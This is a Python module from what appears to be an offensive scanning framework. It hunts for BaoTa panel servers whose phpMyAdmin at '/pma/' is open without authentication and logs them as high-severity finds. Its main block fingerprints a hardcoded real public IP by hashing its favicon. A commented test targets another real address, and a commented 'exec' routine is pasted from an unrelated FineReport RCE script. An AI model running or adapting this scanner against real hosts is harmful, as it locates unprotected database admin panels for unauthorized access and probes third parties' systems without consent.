# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *


class Script(BaseScript):
    name = 'BaoTa phpMyAdmin'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.UNAUTH
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = 'https://mp.weixin.qq.com/s/3ZjwFo5gWlJACSkeYWQLXA'
        # 特定路径判断
        self.detectPathList = ['/pma/']
        # 这里不指定888端口的原因是因为自己端口扫描的时候，如果888为http服务的话，自动会把这个地址放到domainList中进行探测
        # exec
        self.execPathList = ['/']
        # session
        self.session = session
        # 相关信息
        self.info = '''
        Linux 正式版 7.4.2
        Linux 测试版 7.5.13
        Windows 正式版 6.8
        '''

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, verify_ssl=False, timeout=self.reqTimeout, allow_redirects=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'phpmyadmin' in text and response.status == 200:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('BaoTa phpMyAdmin Unauth', url))
                            return {'name': 'BaoTa phpMyadmin Unauth', 'url': url, 'software': 'BaoTa phpMyAdmin'}
        except Exception:
            return None

    # async def exec(self):
    #     try:
    #         async with aiohttp.ClientSession() as session:
    #             for execPath in self.execPathList:
    #                 url = f'http://{self.target}{execPath}' if self.target.startswith(
    #                     ('http:', 'https:')) is False else f'{self.target}{execPath}'
    #                 async with session.get(url=url, timeout=self.reqTimeout, verify_ssl=False) as response:
    #                     if response is not None:
    #                         text = await response.text()
    #                         await asyncio.sleep(2)
    #                         if 'It works!' in text:
    #                             tqdm.write(Fore.RED + '[{}] {}'.format('FineReport RCE', url))
    #                             return {'name': 'Baota phpMyadmin Unauth', 'url': url, 'software': 'Baota phpMyadmin'}
    #     except Exception:
    #         return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            # if self.flag:
            #     b = await self.exec()
            #     if b is not None:
            #         self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib
    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)

    # sem = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1, sem)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack())
